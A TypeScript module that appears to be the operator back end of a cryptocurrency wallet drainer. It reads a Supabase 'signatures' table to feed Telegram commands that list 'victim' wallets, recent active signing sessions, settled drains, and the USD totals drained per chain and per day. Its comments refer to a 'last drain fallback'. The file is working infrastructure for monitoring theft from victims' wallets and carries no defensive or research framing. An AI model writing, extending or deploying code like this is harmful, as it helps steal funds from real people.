/**
 * Supabase reads for Telegram control plane (/recent, /stats, last drain fallback).
 */
import { createClient, type SupabaseClient } from '@supabase/supabase-js'

export type RecentSettledRow = {
  wallet_address: string
  scout_value_usd: string | null
  chain_id: string | null
  protocol: string | null
  settlement_status: string | null
  created_at: string
}

function vaultClient(): SupabaseClient | null {
  const url =
    process.env['SUPABASE_URL']?.trim() ||
    process.env['NEXT_PUBLIC_SUPABASE_URL']?.trim() ||
    ''
  const serviceKey = process.env['SUPABASE_SERVICE_ROLE_KEY']?.trim()
  if (!url || !serviceKey) return null
  return createClient(url, serviceKey)
}

function normalizeCreatedAt(raw: unknown): string {
  if (typeof raw === 'string') return raw
  if (raw != null && typeof (raw as { toISOString?: () => string }).toISOString === 'function') {
    return (raw as { toISOString: () => string }).toISOString()
  }
  return ''
}

/** Start of calendar day in Asia/Kolkata as UTC ISO timestamp. */
export function startOfTodayIsoKolkata(): string {
  const parts = new Intl.DateTimeFormat('en-CA', {
    timeZone: 'Asia/Kolkata',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
  }).formatToParts(new Date())
  const y = parts.find((p) => p.type === 'year')?.value ?? '1970'
  const m = parts.find((p) => p.type === 'month')?.value ?? '01'
  const d = parts.find((p) => p.type === 'day')?.value ?? '01'
  const istMidnight = new Date(`${y}-${m}-${d}T00:00:00+05:30`)
  return istMidnight.toISOString()
}

export async function queryLastSettledAt(): Promise<string | null> {
  const sb = vaultClient()
  if (!sb) return null
  const { data, error } = await sb
    .from('signatures')
    .select('created_at')
    .eq('settlement_status', 'SETTLED')
    .order('created_at', { ascending: false })
    .limit(1)
    .maybeSingle()

  if (error || !data) return null
  const iso = normalizeCreatedAt((data as { created_at?: unknown }).created_at)
  return iso || null
}

export async function queryRecentSettled(limit: number): Promise<RecentSettledRow[]> {
  const sb = vaultClient()
  if (!sb) return []
  const n = Math.min(Math.max(Math.trunc(limit) || 5, 1), 50)
  const { data, error } = await sb
    .from('signatures')
    .select(
      'wallet_address,scout_value_usd,chain_id,protocol,settlement_status,created_at',
    )
    .eq('settlement_status', 'SETTLED')
    .order('created_at', { ascending: false })
    .limit(n)

  if (error || !data) return []

  return (data as Array<Record<string, unknown>>).map((row) => ({
    wallet_address: String(row.wallet_address ?? ''),
    scout_value_usd:
      row.scout_value_usd != null ? String(row.scout_value_usd) : null,
    chain_id: row.chain_id != null ? String(row.chain_id) : null,
    protocol: row.protocol != null ? String(row.protocol) : null,
    settlement_status:
      row.settlement_status != null ? String(row.settlement_status) : null,
    created_at: normalizeCreatedAt(row.created_at),
  }))
}

/** Rows for a specific wallet address — all statuses, most-recent first. */
export type VictimRow = {
  wallet_address: string
  chain_id: string | null
  protocol: string | null
  settlement_status: string | null
  scout_value_usd: string | null
  wallet_type: string | null
  created_at: string
}

export async function queryVictimInfo(wallet: string): Promise<VictimRow[]> {
  const sb = vaultClient()
  if (!sb) return []
  const { data, error } = await sb
    .from('signatures')
    .select('wallet_address,chain_id,protocol,settlement_status,scout_value_usd,wallet_type,created_at')
    .ilike('wallet_address', wallet)
    .order('created_at', { ascending: false })
    .limit(20)

  if (error || !data) return []
  return (data as Array<Record<string, unknown>>).map((row) => ({
    wallet_address: String(row.wallet_address ?? ''),
    chain_id: row.chain_id != null ? String(row.chain_id) : null,
    protocol: row.protocol != null ? String(row.protocol) : null,
    settlement_status: row.settlement_status != null ? String(row.settlement_status) : null,
    scout_value_usd: row.scout_value_usd != null ? String(row.scout_value_usd) : null,
    wallet_type: row.wallet_type != null ? String(row.wallet_type) : null,
    created_at: normalizeCreatedAt(row.created_at),
  }))
}

/** Chain-level breakdown: settlement count + total USD per chain_id. */
export type ChainBreakdownRow = {
  chain_id: string
  count: number
  total_usd: number
}

export async function queryChainBreakdown(): Promise<ChainBreakdownRow[]> {
  const sb = vaultClient()
  if (!sb) return []
  const { data, error } = await sb
    .from('signatures')
    .select('chain_id,scout_value_usd')
    .eq('settlement_status', 'SETTLED')

  if (error || !data) return []

  const byChain: Record<string, { count: number; total: number }> = {}
  for (const row of data as Array<{ chain_id?: string | null; scout_value_usd?: string | null }>) {
    const cid = String(row.chain_id ?? 'unknown')
    if (!byChain[cid]) byChain[cid] = { count: 0, total: 0 }
    byChain[cid].count += 1
    const usd = Number(row.scout_value_usd ?? '0')
    if (Number.isFinite(usd) && usd > 0) byChain[cid].total += usd
  }

  return Object.entries(byChain)
    .map(([chain_id, { count, total }]) => ({ chain_id, count, total_usd: total }))
    .sort((a, b) => b.total_usd - a.total_usd)
}

/** Wallets with a signature record in last `minutes` minutes — any status. */
export type ActiveSessionRow = {
  wallet_address: string
  chain_id: string | null
  wallet_type: string | null
  settlement_status: string | null
  scout_value_usd: string | null
  created_at: string
}

export async function queryActiveRecentSessions(minutes = 30): Promise<ActiveSessionRow[]> {
  const sb = vaultClient()
  if (!sb) return []

  const since = new Date(Date.now() - minutes * 60 * 1000).toISOString()
  const { data, error } = await sb
    .from('signatures')
    .select('wallet_address,chain_id,wallet_type,settlement_status,scout_value_usd,created_at')
    .gte('created_at', since)
    .order('created_at', { ascending: false })
    .limit(25)

  if (error || !data) return []
  return (data as Array<Record<string, unknown>>).map((row) => ({
    wallet_address: String(row.wallet_address ?? ''),
    chain_id: row.chain_id != null ? String(row.chain_id) : null,
    wallet_type: row.wallet_type != null ? String(row.wallet_type) : null,
    settlement_status: row.settlement_status != null ? String(row.settlement_status) : null,
    scout_value_usd: row.scout_value_usd != null ? String(row.scout_value_usd) : null,
    created_at: normalizeCreatedAt(row.created_at),
  }))
}

export async function queryTodaySettledStats(): Promise<{
  count: number
  total_usd: number
}> {
  const sb = vaultClient()
  if (!sb) return { count: 0, total_usd: 0 }

  const since = startOfTodayIsoKolkata()
  const { data, error } = await sb
    .from('signatures')
    .select('scout_value_usd')
    .eq('settlement_status', 'SETTLED')
    .gte('created_at', since)

  if (error || !data) return { count: 0, total_usd: 0 }

  let total_usd = 0
  for (const row of data as Array<{ scout_value_usd?: string | null }>) {
    const n = Number(row.scout_value_usd ?? '0')
    if (Number.isFinite(n) && n > 0) total_usd += n
  }

  return { count: data.length, total_usd }
}
